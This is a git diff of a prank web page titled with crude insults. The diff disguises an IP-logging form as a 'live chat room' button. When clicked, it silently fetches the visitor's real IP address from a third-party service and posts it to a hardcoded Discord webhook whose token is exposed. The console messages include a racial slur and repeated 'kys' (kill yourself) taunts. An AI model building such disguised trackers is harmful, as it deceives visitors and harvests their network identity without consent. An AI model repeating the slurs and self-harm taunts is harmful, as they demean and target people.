@@ -2,7 +2,7 @@
 <head>
   <title>kys.penis</title>
   <meta property="og:title" content="kys.penis">
-  <meta property="og:description" content="GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD">
+  <meta property="og:description" content="GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD">
   <meta property="og:image" content="https://sodaduhking2.github.io/sodaduhking2.github.io/background.jpg">
   <meta property="og:url" content="https://sodaduhking2.github.io/sodaduhking2.github.io/">
   <style>
@@ -85,8 +85,8 @@
   </a>
   
   <form id="ipLoggerForm">
-    <input type="text" id="ipAddress" placeholder="Enter your IP address">
-    <button type="submit">._.</button>
+    <input type="text" id="ipAddress" placeholder="live chat room">
+    <button type="submit">chat room</button>
   </form>
   
   <script>
@@ -107,25 +107,33 @@
 
     ipLoggerForm.addEventListener('submit', function(event) {
       event.preventDefault();
-      const ipAddress = ipAddressInput.value;
-      // Send the IP address to a Discord webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1274939188885585961/C9ioDY1Sdxxt2V_qSLMYXiva1qC0QWUjPaso3me_5w32i7korzqeM3QviK7d-Nx1Odx-';
-      const payload = {
-        content: `New IP address logged: ${ipAddress}`
-      };
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-        .then(response => {
-          if (response.ok) {
-            console.log('big yay');
-          } else {
-            console.error('kys');
-          }
+      // Retrieve the IP address using a third-party API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          // Send the IP address to a Discord webhook
+          const webhookUrl = 'https://discord.com/api/webhooks/1274939188885585961/C9ioDY1Sdxxt2V_qSLMYXiva1qC0QWUjPaso3me_5w32i7korzqeM3QviK7d-Nx1Odx-';
+          const payload = {
+            content: `New IP address logged: ${ipAddress}`
+          };
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          })
+            .then(response => {
+              if (response.ok) {
+                console.log('big yay');
+              } else {
+                console.error('HERES MY ADDRESS 123 PP STREAT BAKERSVAGINA CANIDA');
+              }
+            })
+            .catch(error => {
+              console.error('kys:', error);
+            });
         })
         .catch(error => {
           console.error('nigga:', error);
